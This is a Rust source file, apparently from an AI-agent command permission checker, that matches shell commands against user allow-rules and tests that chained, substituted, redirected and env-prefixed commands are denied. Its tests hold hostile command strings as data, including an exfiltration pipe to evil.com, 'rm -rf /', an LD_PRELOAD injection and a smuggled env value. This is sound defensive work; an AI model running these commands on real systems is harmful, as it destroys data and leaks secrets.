use std::collections::HashSet;
use std::path::Path;

use crate::cst::{Cmd, check};

pub struct Matcher {
    exact: HashSet<String>,
    globs: Vec<Vec<String>>,
}

impl Matcher {
    /// Load allowlist patterns from trusted home config only
    /// (`~/.claude/settings.json`). A project's `.claude/settings.json` is
    /// intentionally not read: it lives in the working tree the agent edits, and
    /// the harness applies its own project settings directly. See
    /// `docs/design/trusted-customization.md`.
    pub fn load() -> Self {
        // Claude's OWN permission file, so it counts only when Claude is the harness being served.
        // Loaded unconditionally, it granted commands under Codex and every other target — see
        // `crate::trust_claude_config`.
        match std::env::var_os("HOME").filter(|_| crate::claude_config_trusted()) {
            Some(home) => Self::load_from_home(Path::new(&home)),
            None => Matcher {
                exact: HashSet::new(),
                globs: Vec::new(),
            },
        }
    }

    fn load_from_home(home: &Path) -> Self {
        let mut patterns = Matcher {
            exact: HashSet::new(),
            globs: Vec::new(),
        };
        patterns.load_file(&home.join(".claude/settings.json"));
        patterns
    }

    fn load_file(&mut self, path: &Path) {
        let Ok(contents) = std::fs::read_to_string(path) else {
            return;
        };
        let Ok(value) = serde_json::from_str::<serde_json::Value>(&contents) else {
            return;
        };

        if let Some(arr) = value.get("approved_commands").and_then(|v| v.as_array()) {
            for entry in arr.iter().filter_map(|e| e.as_str()) {
                self.add_pattern(entry);
            }
        }

        if let Some(arr) = value
            .get("permissions")
            .and_then(|v| v.get("allow"))
            .and_then(|v| v.as_array())
        {
            for entry in arr.iter().filter_map(|e| e.as_str()) {
                self.add_pattern(entry);
            }
        }
    }

    fn add_pattern(&mut self, entry: &str) {
        let Some(inner) = entry.strip_prefix("Bash(").and_then(|s| s.strip_suffix(')')) else {
            return;
        };
        if inner.is_empty() {
            return;
        }
        let normalized = if let Some(prefix) = inner.strip_suffix(":*") {
            format!("{prefix} *")
        } else {
            inner.to_string()
        };
        if normalized.contains('*') {
            self.globs
                .push(normalized.split('*').map(String::from).collect());
        } else {
            self.exact.insert(normalized);
        }
    }

    pub fn matches_cmd(&self, cmd: &Cmd) -> bool {
        let Cmd::Simple(simple) = cmd else {
            return false;
        };
        // `None` = no unambiguous rendering (an env value with whitespace); such a command matches
        // no rule, rather than matching one it could be confused with.
        let Some(normalized) = check::normalize_for_matching(simple) else {
            return false;
        };
        let normalized = normalized.trim();
        if normalized.is_empty() {
            return false;
        }
        if self.exact.contains(normalized) {
            return true;
        }
        self.globs
            .iter()
            .any(|parts| glob_matches(parts, normalized))
    }

    pub fn is_empty(&self) -> bool {
        self.exact.is_empty() && self.globs.is_empty()
    }

    #[cfg(test)]
    pub(crate) fn from_allow_patterns(patterns: &[&str]) -> Self {
        let mut m = Matcher {
            exact: HashSet::new(),
            globs: Vec::new(),
        };
        for p in patterns {
            m.add_pattern(&format!("Bash({p})"));
        }
        m
    }
}

pub fn is_cmd_covered(cmd: &Cmd, patterns: &Matcher) -> bool {
    match cmd {
        Cmd::Simple(_) => {
            check::is_safe_cmd(cmd)
                || (!check::has_unsafe_syntax(cmd) && patterns.matches_cmd(cmd))
        }
        _ => check::is_safe_cmd(cmd),
    }
}

fn glob_matches(parts: &[String], text: &str) -> bool {
    let first = &parts[0];
    let last = &parts[parts.len() - 1];

    if parts.len() == 2 && last.is_empty() && first.ends_with(' ') {
        let prefix = &first[..first.len() - 1];
        return text == prefix || text.starts_with(first.as_str());
    }

    if !text.starts_with(first.as_str()) {
        return false;
    }
    if !text.ends_with(last.as_str()) {
        return false;
    }
    let mut pos = first.len();
    let end = text.len() - last.len();
    if pos > end {
        return false;
    }
    for part in &parts[1..parts.len() - 1] {
        match text[pos..end].find(part.as_str()) {
            Some(idx) => pos += idx + part.len(),
            None => return false,
        }
    }
    pos <= end
}

#[cfg(test)]
mod tests {
    use super::*;
    use std::fs;

    use crate::cst;

    fn empty() -> Matcher {
        Matcher {
            exact: HashSet::new(),
            globs: Vec::new(),
        }
    }

    fn cmd(s: &str) -> Cmd {
        let script = cst::parse(s).unwrap_or_else(|| panic!("failed to parse: {s}"));
        assert_eq!(script.0.len(), 1, "expected single statement: {s}");
        assert_eq!(
            script.0[0].pipeline.commands.len(),
            1,
            "expected single command: {s}"
        );
        script.0[0].pipeline.commands[0].clone()
    }

    fn segments(command: &str) -> Vec<Cmd> {
        let script = cst::parse(command).unwrap_or_else(|| panic!("failed to parse: {command}"));
        script
            .0
            .into_iter()
            .flat_map(|stmt| stmt.pipeline.commands)
            .collect()
    }

    fn is_covered(cmd: &Cmd, patterns: &Matcher) -> bool {
        is_cmd_covered(cmd, patterns)
    }

    fn all_covered(command: &str, patterns: &Matcher) -> bool {
        let Some(script) = cst::parse(command) else {
            return false;
        };
        script.0.iter().all(|stmt| {
            check::is_safe_pipeline(&stmt.pipeline)
                || stmt
                    .pipeline
                    .commands
                    .iter()
                    .all(|c| is_cmd_covered(c, patterns))
        })
    }

    #[test]
    fn parse_exact_pattern() {
        let mut p = empty();
        p.add_pattern("Bash(npm test)");
        assert!(p.exact.contains("npm test"));
        assert!(p.globs.is_empty());
    }

    #[test]
    fn parse_legacy_colon_star() {
        let mut p = empty();
        p.add_pattern("Bash(npm run:*)");
        assert!(p.exact.is_empty());
        assert_eq!(p.globs.len(), 1);
    }

    #[test]
    fn parse_space_star() {
        let mut p = empty();
        p.add_pattern("Bash(npm run *)");
        assert!(p.exact.is_empty());
        assert_eq!(p.globs.len(), 1);
    }

    #[test]
    fn parse_non_bash_skipped() {
        let mut p = empty();
        p.add_pattern("WebFetch");
        p.add_pattern("XcodeBuildMCP");
        assert!(p.is_empty());
    }

    #[test]
    fn parse_empty_bash_skipped() {
        let mut p = empty();
        p.add_pattern("Bash()");
        assert!(p.is_empty());
    }

    #[test]
    fn match_exact() {
        let mut p = empty();
        p.add_pattern("Bash(npm test)");
        assert!(p.matches_cmd(&cmd("npm test")));
        assert!(!p.matches_cmd(&cmd("npm test --watch")));
    }

    #[test]
    fn match_space_star_word_boundary() {
        let mut p = empty();
        p.add_pattern("Bash(ls *)");
        assert!(p.matches_cmd(&cmd("ls -la")));
        assert!(p.matches_cmd(&cmd("ls foo")));
        assert!(!p.matches_cmd(&cmd("lsof")));
    }

    #[test]
    fn match_star_no_space_no_boundary() {
        let mut p = empty();
        p.add_pattern("Bash(ls*)");
        assert!(p.matches_cmd(&cmd("ls -la")));
        assert!(p.matches_cmd(&cmd("lsof")));
    }

    #[test]
    fn match_legacy_colon_star_word_boundary() {
        let mut p = empty();
        p.add_pattern("Bash(npm run:*)");
        assert!(p.matches_cmd(&cmd("npm run build")));
        assert!(p.matches_cmd(&cmd("npm run test")));
        assert!(!p.matches_cmd(&cmd("npm running")));
        assert!(!p.matches_cmd(&cmd("npm install")));
    }

    #[test]
    fn match_star_at_beginning() {
        let mut p = empty();
        p.add_pattern("Bash(* --version)");
        assert!(p.matches_cmd(&cmd("npm --version")));
        assert!(p.matches_cmd(&cmd("cargo --version")));
        assert!(!p.matches_cmd(&cmd("npm --help")));
    }

    #[test]
    fn match_star_in_middle() {
        let mut p = empty();
        p.add_pattern("Bash(git * main)");
        assert!(p.matches_cmd(&cmd("git checkout main")));
        assert!(p.matches_cmd(&cmd("git merge main")));
        assert!(!p.matches_cmd(&cmd("git checkout develop")));
    }

    /// REVERSED (2026-07-26). This previously asserted that the env prefix was STRIPPED, so
    /// `Bash(bundle install)` also covered `RACK_ENV=test bundle install`. Convenient, but it means
    /// a rule cannot distinguish forms the user needs distinguished: the same stripping made
    /// `Bash(~/runner-scripts/x.sh:*)` cover `WRITE=1 ~/runner-scripts/x.sh`, pre-approving a
    /// mutating run from a rule written for a dry one — and safe-chains answered `allow`, so the
    /// harness never got to ask.
    ///
    /// The convenience is not lost: `RACK_ENV=test bundle install` still auto-approves, because
    /// safe-chains knows `bundle install` on its own terms and never consults the user's rules for
    /// it. What changed is only what a USER-WRITTEN rule covers, and now it covers what it says.
    ///
    /// Contrast `match_fd_redirect_stripped` below, which still strips: `2>&1` cannot change which
    /// program runs or with what, so it does not make the invocation a different command.
    #[test]
    fn match_env_prefix_is_not_stripped() {
        let mut p = empty();
        p.add_pattern("Bash(bundle install)");
        assert!(!p.matches_cmd(&cmd("RACK_ENV=test bundle install")));
        assert!(p.matches_cmd(&cmd("bundle install")));

        let mut q = empty();
        q.add_pattern("Bash(RACK_ENV=test bundle install)");
        assert!(q.matches_cmd(&cmd("RACK_ENV=test bundle install")));
    }

    #[test]
    fn match_fd_redirect_stripped() {
        let mut p = empty();
        p.add_pattern("Bash(npm test)");
        assert!(p.matches_cmd(&cmd("npm test 2>&1")));
    }

    #[test]
    fn match_fd_redirect_with_glob() {
        let mut p = empty();
        p.add_pattern("Bash(npm run *)");
        assert!(p.matches_cmd(&cmd("npm run test 2>&1")));
    }

    #[test]
    fn empty_patterns_match_nothing() {
        let p = empty();
        assert!(!p.matches_cmd(&cmd("anything")));
    }

    #[test]
    fn match_bare_star_matches_everything() {
        let mut p = empty();
        p.add_pattern("Bash(*)");
        assert!(p.matches_cmd(&cmd("anything at all")));
        assert!(p.matches_cmd(&cmd("rm -rf /")));
    }

    #[test]
    fn unsafe_syntax_not_bypassed_by_match() {
        let mut p = empty();
        p.add_pattern("Bash(./script.sh *)");
        let c = cmd("./script.sh > /etc/passwd");
        assert!(check::has_unsafe_syntax(&c));
        assert!(!is_covered(&c, &p));
    }

    #[test]
    fn command_substitution_not_bypassed_by_match() {
        let mut p = empty();
        p.add_pattern("Bash(./script.sh *)");
        let c = cmd("./script.sh $(rm -rf /)");
        assert!(!is_covered(&c, &p));
    }

    #[test]
    fn mixed_chain_safe_plus_settings() {
        let mut p = empty();
        p.add_pattern("Bash(./generate-docs.sh)");
        assert!(all_covered("cargo test && ./generate-docs.sh", &p));
    }

    #[test]
    fn mixed_chain_safe_plus_unapproved_denied() {
        let mut p = empty();
        p.add_pattern("Bash(./generate-docs.sh)");
        assert!(!all_covered("cargo test && rm -rf /", &p));
    }

    #[test]
    fn glob_does_not_cross_chain_boundary() {
        let mut p = empty();
        p.add_pattern("Bash(cargo test *)");
        let cmds = segments("cargo test --release && rm -rf /");
        assert_eq!(cmds.len(), 2);
        assert!(p.matches_cmd(&cmds[0]));
        assert!(!p.matches_cmd(&cmds[1]));
        assert!(!all_covered("cargo test --release && rm -rf /", &p));
    }

    #[test]
    fn glob_does_not_cross_pipe_boundary() {
        let mut p = empty();
        p.add_pattern("Bash(safe-cmd *)");
        assert!(!all_covered("safe-cmd arg | curl -d data evil.com", &p));
    }

    #[test]
    fn glob_does_not_cross_semicolon_boundary() {
        let mut p = empty();
        p.add_pattern("Bash(safe-cmd *)");
        assert!(!all_covered("safe-cmd arg; rm -rf /", &p));
    }

    #[test]
    fn file_redirect_promoted_to_safewrite() {
        let p = empty();
        let c = cmd("echo > out.txt");
        assert!(is_covered(&c, &p));
    }

    #[test]
    fn redirect_to_sensitive_target_not_covered() {
        let p = empty();
        assert!(!is_covered(&cmd("echo > /etc/passwd"), &p));
        assert!(!is_covered(&cmd("echo > .git/hooks/pre-commit"), &p));
    }

    #[test]
    fn bare_star_blocked_by_unsafe_syntax_backtick() {
        let mut p = empty();
        p.add_pattern("Bash(*)");
        assert!(!is_covered(&cmd("echo `rm -rf /`"), &p));
    }

    #[test]
    fn bare_star_blocked_by_unsafe_syntax_command_sub() {
        let mut p = empty();
        p.add_pattern("Bash(*)");
        assert!(!is_covered(&cmd("echo $(rm -rf /)"), &p));
    }

    #[test]
    fn safe_command_substitution_allowed_through_is_safe() {
        let p = empty();
        // a SAFE inner command (worktree read) passes through; `cat /etc/shadow` would now
        // correctly deny as a secret, so use a genuinely-safe substitution.
        assert!(is_covered(&cmd("echo $(cat ./notes.txt)"), &p));
    }

    #[test]
    fn nested_shell_not_recursively_validated_by_settings() {
        let mut p = empty();
        p.add_pattern("Bash(bash *)");
        let c = cmd("bash -c 'safe-cmd && rm -rf /'");
        assert!(!check::is_safe_cmd(&c));
        assert!(!check::has_unsafe_syntax(&c));
        assert!(is_covered(&c, &p));
    }

    #[test]
    fn nested_shell_redirect_promoted_to_safewrite() {
        let p = empty();
        let c = cmd("bash -c 'echo hello' > /tmp/out");
        assert!(is_covered(&c, &p));
    }

    #[test]
    fn quoted_operators_stay_as_one_segment() {
        let mut p = empty();
        p.add_pattern("Bash(./script *)");
        assert!(all_covered("./script 'arg && rm -rf /'", &p));
    }

    #[test]
    fn load_from_home_reads_home_settings() {
        let home = tempfile::tempdir().unwrap();
        let claude_dir = home.path().join(".claude");
        fs::create_dir_all(&claude_dir).unwrap();
        fs::write(
            claude_dir.join("settings.json"),
            r#"{"permissions":{"allow":["Bash(./generate-docs.sh:*)"]}}"#,
        )
        .unwrap();
        let p = Matcher::load_from_home(home.path());
        assert!(p.matches_cmd(&cmd("./generate-docs.sh")));
        assert!(p.matches_cmd(&cmd("./generate-docs.sh --verbose")));
        assert!(!p.matches_cmd(&cmd("./evil.sh")));
    }

    #[test]
    fn load_from_home_ignores_project_settings() {
        // A project's .claude/settings.json living next to home is never read:
        // only ~/.claude/settings.json is. Here the project tree has an allow
        // entry that must not take effect.
        let home = tempfile::tempdir().unwrap();
        let project = tempfile::tempdir().unwrap();
        let project_claude = project.path().join(".claude");
        fs::create_dir_all(&project_claude).unwrap();
        fs::write(
            project_claude.join("settings.json"),
            r#"{"permissions":{"allow":["Bash(rm -rf *)"]}}"#,
        )
        .unwrap();
        let p = Matcher::load_from_home(home.path());
        assert!(!p.matches_cmd(&cmd("rm -rf /")));
        assert!(p.is_empty());
    }

    #[test]
    fn load_from_home_chains_with_builtins() {
        let home = tempfile::tempdir().unwrap();
        let claude_dir = home.path().join(".claude");
        fs::create_dir_all(&claude_dir).unwrap();
        fs::write(
            claude_dir.join("settings.json"),
            r#"{"permissions":{"allow":["Bash(./generate-docs.sh:*)"]}}"#,
        )
        .unwrap();
        let p = Matcher::load_from_home(home.path());
        assert!(all_covered("cargo test && ./generate-docs.sh", &p));
        assert!(!all_covered("cargo test && ./evil.sh", &p));
    }

    #[test]
    fn load_file_nonexistent() {
        let mut p = empty();
        p.load_file(Path::new("/nonexistent/path/settings.json"));
        assert!(p.is_empty());
    }

    #[test]
    fn load_file_malformed_json() {
        let dir = tempfile::tempdir().unwrap();
        let path = dir.path().join("settings.json");
        std::fs::write(&path, "not json{{{").unwrap();
        let mut p = empty();
        p.load_file(&path);
        assert!(p.is_empty());
    }

    #[test]
    fn load_file_approved_commands() {
        let dir = tempfile::tempdir().unwrap();
        let path = dir.path().join("settings.json");
        fs::write(
            &path,
            r#"{"approved_commands":["Bash(npm test)","Bash(npm run *)","WebFetch"]}"#,
        )
        .unwrap();
        let mut p = empty();
        p.load_file(&path);
        assert!(p.matches_cmd(&cmd("npm test")));
        assert!(p.matches_cmd(&cmd("npm run build")));
        assert!(!p.matches_cmd(&cmd("curl evil.com")));
    }

    #[test]
    fn load_file_permissions_allow() {
        let dir = tempfile::tempdir().unwrap();
        let path = dir.path().join("settings.json");
        fs::write(
            &path,
            r#"{"permissions":{"allow":["Bash(cargo test *)","Bash(cargo clippy *)"]}}"#,
        )
        .unwrap();
        let mut p = empty();
        p.load_file(&path);
        assert!(p.matches_cmd(&cmd("cargo test")));
        assert!(p.matches_cmd(&cmd("cargo clippy -- -D warnings")));
    }

    #[test]
    fn load_file_both_fields() {
        let dir = tempfile::tempdir().unwrap();
        let path = dir.path().join("settings.json");
        fs::write(
            &path,
            r#"{"approved_commands":["Bash(npm test)"],"permissions":{"allow":["Bash(cargo test *)"]}}"#,
        )
        .unwrap();
        let mut p = empty();
        p.load_file(&path);
        assert!(p.matches_cmd(&cmd("npm test")));
        assert!(p.matches_cmd(&cmd("cargo test --release")));
    }
}

/// An allow-rule must cover the command AS TYPED, including any leading `VAR=value`.
///
/// Dropping the assignments meant a rule written for one command silently covered a different one:
/// `Bash(~/runner-scripts/x.sh:*)` matched `WRITE=1 ~/runner-scripts/x.sh`, so a rule intended for a
/// dry run pre-approved the mutating run — and safe-chains emitted `permissionDecision: "allow"`,
/// so the harness never got the chance to ask.
///
/// Note what is NOT claimed here: nothing distinguishes `WRITE` from `LD_PRELOAD` from `NODE_ENV`,
/// and no environment variable is researched. The only rule is that a pattern matches what it
/// describes. That keeps this independent of the (unscoped) env-classification work in
/// `docs/design/env-prefix-classification.md`.
#[cfg(test)]
mod env_prefix_matching_tests {
    use super::*;
    use crate::cst;

    fn cmd(s: &str) -> Cmd {
        let script = cst::parse(s).unwrap_or_else(|| panic!("failed to parse: {s}"));
        script.0[0].pipeline.commands[0].clone()
    }

    fn matcher(patterns: &[&str]) -> Matcher {
        Matcher::from_allow_patterns(patterns)
    }

    #[test]
    fn a_plain_command_still_matches_its_rule() {
        let m = matcher(&["~/runner-scripts/x.sh:*"]);
        assert!(m.matches_cmd(&cmd("~/runner-scripts/x.sh")));
        assert!(m.matches_cmd(&cmd("~/runner-scripts/x.sh --dry-run")));
    }

    #[test]
    fn an_env_prefix_does_not_match_a_rule_without_one() {
        let m = matcher(&["~/runner-scripts/x.sh:*"]);
        for c in [
            "WRITE=1 ~/runner-scripts/x.sh",
            "WRITE=1 ~/runner-scripts/x.sh --project p",
            "PROJECT=p ~/runner-scripts/x.sh",
            "LD_PRELOAD=/tmp/evil.so ~/runner-scripts/x.sh",
        ] {
            assert!(!m.matches_cmd(&cmd(c)), "rule without env matched: {c}");
        }
    }

    #[test]
    fn a_rule_that_declares_the_env_prefix_matches_it() {
        // The form already in the user's settings for deliberately-approved mutations.
        let m = matcher(&["WRITE=1 ~/runner-scripts/x.sh:*", "~/runner-scripts/x.sh:*"]);
        assert!(m.matches_cmd(&cmd("WRITE=1 ~/runner-scripts/x.sh")));
        assert!(m.matches_cmd(&cmd("WRITE=1 ~/runner-scripts/x.sh --force")));
        assert!(m.matches_cmd(&cmd("~/runner-scripts/x.sh")));
        // ...but only THAT assignment; a different one is a different command.
        assert!(!m.matches_cmd(&cmd("WRITE=0 ~/runner-scripts/x.sh")));
        assert!(!m.matches_cmd(&cmd("DEBUG=1 ~/runner-scripts/x.sh")));
    }

    #[test]
    fn every_assignment_must_be_accounted_for() {
        let m = matcher(&["A=1 tool:*"]);
        assert!(m.matches_cmd(&cmd("A=1 tool")));
        // A second assignment the rule never mentioned makes it a different command.
        assert!(!m.matches_cmd(&cmd("A=1 B=2 tool")));
        assert!(!m.matches_cmd(&cmd("B=2 A=1 tool")));
    }

    #[test]
    fn an_exact_rule_behaves_the_same_as_a_glob_rule() {
        let exact = matcher(&["tool run"]);
        assert!(exact.matches_cmd(&cmd("tool run")));
        assert!(!exact.matches_cmd(&cmd("WRITE=1 tool run")));
    }

    /// An env VALUE containing whitespace has no unambiguous flat rendering, and assignments sit
    /// BEFORE the program name — so a value that swallows the rest of a pattern would let a rule
    /// for one program match a different one. This was live for a few minutes during development:
    /// `Bash(WRITE=1 ~/runner-scripts/x.sh:*)` matched `WRITE='1 ~/runner-scripts/x.sh' rm -rf /`,
    /// which runs `rm`. Such a command now matches nothing.
    #[test]
    fn a_value_containing_whitespace_matches_no_rule() {
        let m = matcher(&["WRITE=1 ~/runner-scripts/x.sh:*"]);
        assert!(m.matches_cmd(&cmd("WRITE=1 ~/runner-scripts/x.sh --force")));
        assert!(
            !m.matches_cmd(&cmd("WRITE='1 ~/runner-scripts/x.sh' rm -rf /")),
            "a spaced value smuggled the pattern and matched a different program",
        );

        // Same shape without the glob: two different programs must not share a rendering.
        let n = matcher(&["FOO=bar baz ls"]);
        assert!(n.matches_cmd(&cmd("FOO=bar baz ls")));   // runs `baz`
        assert!(!n.matches_cmd(&cmd("FOO='bar baz' ls"))); // runs `ls`
    }

    /// Quoted WORDS keep matching — `git commit -m 'a message'` is ordinary, and a quoted argument
    /// cannot change which program runs, since the program is the first word either way. Only the
    /// pre-program assignments are refused.
    #[test]
    fn a_quoted_word_still_matches() {
        let m = matcher(&["git commit -m:*"]);
        assert!(m.matches_cmd(&cmd("git commit -m 'a message with spaces'")));
    }

    /// The property, over every rule shape the matcher supports: if a command matches a rule, then
    /// the same command with ANY assignment prepended must not — unless the rule declares it.
    /// Stated generally so a future pattern form cannot reintroduce the hole for one spelling.
    #[test]
    fn prepending_any_assignment_breaks_a_match_the_rule_does_not_declare() {
        let rules = ["tool", "tool:*", "tool sub", "tool sub:*", "~/runner-scripts/x.sh:*"];
        let commands = ["tool", "tool sub", "tool sub --flag", "~/runner-scripts/x.sh --flag"];
        let assignments = ["WRITE=1", "PROJECT=p", "LD_PRELOAD=/tmp/e.so", "A=1"];

        let mut checked = 0;
        for rule in rules {
            let m = matcher(&[rule]);
            for c in commands {
                if !m.matches_cmd(&cmd(c)) {
                    continue; // only meaningful where the bare command DOES match
                }
                for a in assignments {
                    let prefixed = format!("{a} {c}");
                    assert!(
                        !m.matches_cmd(&cmd(&prefixed)),
                        "rule `{rule}` matched `{prefixed}` without declaring `{a}`",
                    );
                    checked += 1;
                }
            }
        }
        assert!(checked > 0, "no rule/command pair matched — the property would be vacuous");
    }
}
